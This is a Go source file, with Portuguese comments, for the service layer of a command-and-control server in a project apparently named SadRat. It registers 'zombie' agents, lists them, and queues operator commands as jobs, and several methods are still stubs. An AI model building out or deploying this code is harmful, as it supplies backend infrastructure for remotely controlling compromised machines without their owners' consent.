package service

import (
	"github.com/google/uuid"
	"github.com/VitorDie/SadRat/internal/domain"
)

// ConcreteServer é a Camada de Serviço que guarda as regras de negócio do C&C
type ConcreteServer struct {
	db domain.ServerDB // Injeção de dependência do Banco de Dados
}

// NewConcreteServer constrói a regra de negócio injetando o repositório
func NewConcreteServer(db domain.ServerDB) *ConcreteServer {
	return &ConcreteServer{db: db}
}

// GiveAnUUIDForAgentRequest cria o ID do Zumbi, salva no banco e o retorna
func (s *ConcreteServer) GiveAnUUIDForAgentRequest() (string, error) {
	// 1. Regra de Negócio: Gerar um UUID único
	newUUID := uuid.NewString()
	
	// 2. Regra de Negócio: Transformar em Entidade do Domínio
	agentRow := domain.NewAgentRow(newUUID)

	// 3. Persistência: Chamar o banco de dados (que no teste é um Mock!)
	if err := s.db.SaveAgent(agentRow); err != nil {
		return "", err
	}

	// 4. Retorna a resposta limpa e agnóstica de rede
	return newUUID, nil
}

// =========================================================================
// STUBS: Métodos abaixo criados apenas para satisfazer a interface domain.Server.
// Vamos implementá-los um a um nos próximos ciclos de TDD!
// =========================================================================

// SendAvailableAgents busca todos os zumbis registrados no banco e os retorna
func (s *ConcreteServer) SendAvailableAgents() ([]domain.AgentRow, error) {
	// A regra de negócio aqui delega a busca para a interface do Banco de Dados
	return s.db.GetAllAgents()
}

// ReceiveCommand recebe o comando do Operador, transforma em Entidade, salva e retorna o ID
func (s *ConcreteServer) ReceiveCommand(command string, args []string, agentID string) (string, error) {
	// 1. Regra de Negócio: Criamos a Entidade (que já gera o UUID do Job internamente)
	jobRow := domain.NewJobRow(agentID, command, args)

	// 2. Persistência: Injetamos o comando na fila do Banco de Dados
	if err := s.db.SaveJob(jobRow); err != nil {
		return "", err
	}

	// 3. Retornamos o ID do Job para o "Garçom" (HandlerHTTP) repassar ao Operador
	return jobRow.ID, nil
}

func (s *ConcreteServer) SendJobs(agentID string) (domain.JobRow, error) {
	return domain.JobRow{}, nil
}

func (s *ConcreteServer) ReceiveJobResult(jobID string, output string) error {
	return nil
}

func (s *ConcreteServer) SendJobResult(jobID string) (string, error) {
	return "", nil
}

func (s *ConcreteServer) SendAllJobResults() ([]domain.JobRow, error) {
	return nil, nil
}
